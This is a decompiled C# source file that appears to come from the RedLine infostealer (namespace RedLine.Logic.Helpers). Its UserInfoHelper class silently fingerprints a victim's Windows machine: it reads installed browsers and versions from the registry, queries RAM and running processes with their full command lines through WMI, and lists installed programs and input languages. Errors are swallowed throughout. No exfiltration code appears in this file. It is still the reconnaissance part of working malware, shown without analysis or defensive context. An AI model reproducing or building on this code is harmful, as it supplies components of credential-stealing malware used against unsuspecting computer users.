using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.Win32;
using RedLine.Logic.Extensions;
using RedLine.Models;

namespace RedLine.Logic.Helpers
{
	// Token: 0x0200005D RID: 93
	public static class UserInfoHelper
	{
		// Token: 0x0600029F RID: 671 RVA: 0x0000B114 File Offset: 0x00009314
		public static List<InstalledBrowserInfo> GetBrowsers()
		{
			List<InstalledBrowserInfo> list = new List<InstalledBrowserInfo>();
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet");
				if (registryKey == null)
				{
					registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Clients\\StartMenuInternet");
				}
				string[] subKeyNames = registryKey.GetSubKeyNames();
				for (int i = 0; i < subKeyNames.Length; i++)
				{
					InstalledBrowserInfo installedBrowserInfo = new InstalledBrowserInfo();
					RegistryKey registryKey2 = registryKey.OpenSubKey(subKeyNames[i]);
					installedBrowserInfo.Name = (string)registryKey2.GetValue(null);
					RegistryKey registryKey3 = registryKey2.OpenSubKey("shell\\open\\command");
					installedBrowserInfo.Path = registryKey3.GetValue(null).ToString().StripQuotes();
					if (installedBrowserInfo.Path != null)
					{
						installedBrowserInfo.Version = FileVersionInfo.GetVersionInfo(installedBrowserInfo.Path).FileVersion;
					}
					else
					{
						installedBrowserInfo.Version = "Unknown Version";
					}
					list.Add(installedBrowserInfo);
				}
				InstalledBrowserInfo edgeVersion = UserInfoHelper.GetEdgeVersion();
				if (edgeVersion != null)
				{
					list.Add(edgeVersion);
				}
			}
			catch (Exception)
			{
			}
			return list;
		}

		// Token: 0x060002A0 RID: 672 RVA: 0x0000B214 File Offset: 0x00009414
		public static string TotalOfRAM()
		{
			string result = string.Empty;
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem"))
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							ManagementObject managementObject = (ManagementObject)managementBaseObject;
							try
							{
								double num = Convert.ToDouble(managementObject["TotalVisibleMemorySize"]);
								double num2 = num * 1024.0;
								double num3 = Math.Round(num / 1024.0, 2);
								result = string.Format("{0} MB or {1}", num3, num2).Replace(",", ".");
							}
							catch
							{
							}
						}
					}
				}
			}
			catch (Exception)
			{
			}
			return result;
		}

		// Token: 0x060002A1 RID: 673 RVA: 0x0000B320 File Offset: 0x00009520
		private static InstalledBrowserInfo GetEdgeVersion()
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\AppModel\\SystemAppData\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\Schemas");
			if (registryKey != null)
			{
				Match match = Regex.Match(registryKey.GetValue("PackageFullName").ToString().StripQuotes(), "(((([0-9.])\\d)+){1})");
				if (match.Success)
				{
					return new InstalledBrowserInfo
					{
						Name = "MicrosoftEdge",
						Version = match.Value
					};
				}
			}
			return null;
		}

		// Token: 0x060002A2 RID: 674 RVA: 0x0000B388 File Offset: 0x00009588
		public static List<string> ListOfProcesses()
		{
			List<string> list = new List<string>();
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(string.Format("SELECT * FROM Win32_Process Where SessionId='{0}'", Process.GetCurrentProcess().SessionId)))
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							ManagementObject managementObject = (ManagementObject)managementBaseObject;
							try
							{
								List<string> list2 = list;
								string[] array = new string[6];
								array[0] = "ID: ";
								int num = 1;
								object obj = managementObject["ProcessId"];
								array[num] = ((obj != null) ? obj.ToString() : null);
								array[2] = ", Name: ";
								int num2 = 3;
								object obj2 = managementObject["Name"];
								array[num2] = ((obj2 != null) ? obj2.ToString() : null);
								array[4] = ", CommandLine: ";
								int num3 = 5;
								object obj3 = managementObject["CommandLine"];
								array[num3] = ((obj3 != null) ? obj3.ToString() : null);
								list2.Add(string.Concat(array));
							}
							catch
							{
							}
						}
					}
				}
			}
			catch (Exception)
			{
			}
			return list;
		}

		// Token: 0x060002A3 RID: 675 RVA: 0x0000B4D0 File Offset: 0x000096D0
		public static List<string> ListOfPrograms()
		{
			List<string> list = new List<string>();
			try
			{
				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"))
				{
					foreach (string name in registryKey.GetSubKeyNames())
					{
						using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
						{
							string text = (string)((registryKey2 != null) ? registryKey2.GetValue("DisplayName") : null);
							string str = (string)((registryKey2 != null) ? registryKey2.GetValue("DisplayVersion") : null);
							if (!string.IsNullOrEmpty(text))
							{
								list.Add(Regex.Replace(text + " [" + str + "]", "[^\\u0020-\\u007F]", string.Empty));
							}
						}
					}
				}
			}
			catch (Exception)
			{
			}
			return (from x in list
			orderby x
			select x).ToList<string>();
		}

		// Token: 0x060002A4 RID: 676 RVA: 0x0000B5F4 File Offset: 0x000097F4
		public static List<string> AvailableLanguages()
		{
			List<string> list = new List<string>();
			try
			{
				foreach (object obj in InputLanguage.InstalledInputLanguages)
				{
					InputLanguage inputLanguage = (InputLanguage)obj;
					list.Add(inputLanguage.Culture.EnglishName);
				}
			}
			catch (Exception)
			{
			}
			return list;
		}
	}
}
